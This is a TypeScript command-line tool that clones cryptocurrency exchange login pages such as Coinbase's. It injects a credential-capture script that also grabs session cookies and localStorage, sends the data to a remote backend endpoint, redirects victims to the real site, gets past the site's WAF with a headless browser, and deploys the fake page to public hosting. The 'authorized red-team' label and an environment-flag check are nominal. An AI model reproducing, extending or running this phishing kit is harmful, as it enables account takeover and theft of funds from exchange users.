/**
 * CEX login page static clone — authorized red-team credential capture research.
 *
 * Usage:
 *   PHISHING_TRAINING_MODE=true pnpm cex-clone https://coinbase.com/login ./clones/coinbase
 *   pnpm cex-clone --cex coinbase --mobile-optimize --deploy https://coinbase.com/login ./clones/coinbase
 *   pnpm cex-clone --backend-url https://sadrailala-production.up.railway.app <url> <outDir>
 */
import { mkdir, writeFile } from 'node:fs/promises'
import path from 'node:path'

import {
  buildCredCaptureJs,
  deployStaticClone,
  downloadAssets,
  fetchCexLoginHtml,
  injectCexScripts,
  resolveBackendUrl,
  resolveCexNameFromUrl,
  resolveRedirectUrl,
  rewriteHtmlAssets,
  writeMobileOptimizeAssets,
} from './lib/cex-clone-lib.js'

interface CliArgs {
  targetUrl: string
  outDir: string
  exchange?: string
  backendUrl: string
  mobileOptimize: boolean
  deploy: boolean
  authorized: boolean
}

function fail(msg: string): never {
  console.error(`[cex-clone] ${msg}`)
  process.exit(1)
}

function isTruthyEnv(key: string): boolean {
  const v = process.env[key]?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

function parseArgs(argv: string[]): CliArgs {
  const args = [...argv]
  let exchange: string | undefined
  let backendUrl: string | undefined
  let mobileOptimize = false
  let deploy = false
  let authorized = false

  for (let i = 0; i < args.length; i++) {
    const arg = args[i]!
    if (arg === '--cex') {
      exchange = args[i + 1]?.trim()
      if (!exchange) fail('--cex requires a name (e.g. coinbase)')
      args.splice(i, 2)
      i--
    } else if (arg === '--backend-url') {
      backendUrl = args[i + 1]?.trim()
      if (!backendUrl) fail('--backend-url requires a URL')
      args.splice(i, 2)
      i--
    } else if (arg === '--mobile-optimize') {
      mobileOptimize = true
      args.splice(i, 1)
      i--
    } else if (arg === '--deploy') {
      deploy = true
      args.splice(i, 1)
      i--
    } else if (arg === '--authorized' || arg === '--authorized-test') {
      authorized = true
      args.splice(i, 1)
      i--
    }
  }

  const targetRaw = args[0]?.trim()
  const outDirRaw = args[1]?.trim()
  if (!targetRaw || !outDirRaw) {
    fail(
      'Usage: pnpm cex-clone [--cex <name>] [--mobile-optimize] [--deploy] [--backend-url <url>] <targetUrl> <outputDir>\n' +
        'Example: pnpm cex-clone https://coinbase.com/login ./clones/coinbase --deploy',
    )
  }

  const withScheme = /^https?:\/\//i.test(targetRaw) ? targetRaw : `https://${targetRaw}`
  try {
    const url = new URL(withScheme)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') fail(`Unsupported protocol: ${url.protocol}`)
    return {
      targetUrl: url.href,
      outDir: path.resolve(outDirRaw),
      exchange,
      backendUrl: resolveBackendUrl(backendUrl),
      mobileOptimize,
      deploy,
      authorized,
    }
  } catch {
    fail(`Invalid target URL: ${targetRaw}`)
  }
}

async function main(): Promise<void> {
  const cli = parseArgs(process.argv.slice(2))

  if (!cli.authorized && !isTruthyEnv('PHISHING_TRAINING_MODE')) {
    fail('Set PHISHING_TRAINING_MODE=true or pass --authorized (authorized red-team only)')
  }

  const target = new URL(cli.targetUrl)
  const exchange = resolveCexNameFromUrl(target, cli.exchange)
  const redirectUrl = resolveRedirectUrl(target, exchange)
  const apiKey = process.env['CEX_CREDS_API_KEY']?.trim()

  console.info(`[cex-clone] Exchange: ${exchange}`)
  console.info(`[cex-clone] Target: ${target.href}`)
  console.info(`[cex-clone] Backend: ${cli.backendUrl}/api/v1/creds`)
  console.info(`[cex-clone] Post-capture redirect: ${redirectUrl}`)

  await mkdir(cli.outDir, { recursive: true })

  console.info(`[cex-clone] Fetching login page…`)
  const { html: fetchedHtml, usedHeadless } = await fetchCexLoginHtml(target, cli.outDir)
  if (usedHeadless) {
    console.info('[cex-clone] Headless capture used (WAF bypass)')
  }
  let html = fetchedHtml
  const assetsDir = path.join(cli.outDir, 'assets')
  const urlToLocal = await downloadAssets(html, target, assetsDir)
  html = rewriteHtmlAssets(html, target, urlToLocal)

  if (cli.mobileOptimize) {
    await writeMobileOptimizeAssets(cli.outDir)
  }

  const captureSessionCookies =
    process.env['CEX_CAPTURE_SESSION_COOKIES']?.trim().toLowerCase() !== 'false'
  const captureJs = await buildCredCaptureJs({
    backendUrl: cli.backendUrl,
    exchange,
    redirectUrl,
    apiKey,
    captureSessionCookies,
  })
  if (captureSessionCookies) {
    console.info('[cex-clone] Session cookie + localStorage capture enabled')
  }
  await writeFile(path.join(cli.outDir, 'legion-cex-capture.js'), captureJs, 'utf8')

  html = injectCexScripts(html, cli.mobileOptimize)
  await writeFile(path.join(cli.outDir, 'index.html'), html, 'utf8')

  let deployUrl: string | null = null
  if (cli.deploy) {
    deployUrl = await deployStaticClone(cli.outDir)
    if (deployUrl) console.info(`[cex-clone] Deployed: ${deployUrl}`)
    else console.warn('[cex-clone] Deploy failed — set VERCEL_TOKEN or NETLIFY_TOKEN')
  }

  await writeFile(
    path.join(cli.outDir, 'cex-clone-config.json'),
    JSON.stringify(
      {
        authorized_red_team: true,
        exchange,
        source_url: target.href,
        backend_creds_endpoint: `${cli.backendUrl}/api/v1/creds`,
        redirect_after_capture: redirectUrl,
        mobile_optimize: cli.mobileOptimize,
        deploy_url: deployUrl,
        assets_downloaded: urlToLocal.size,
        generated_at: new Date().toISOString(),
        notes: 'Authorized red-team CEX login clone — credentials stored in captured_creds table.',
      },
      null,
      2,
    ),
    'utf8',
  )

  console.info(`[cex-clone] Wrote ${cli.outDir}`)
  console.info(`[cex-clone] Serve: npx --yes serve "${cli.outDir}" -l 8080`)
}

main().catch((e) => {
  fail(e instanceof Error ? e.message : String(e))
})
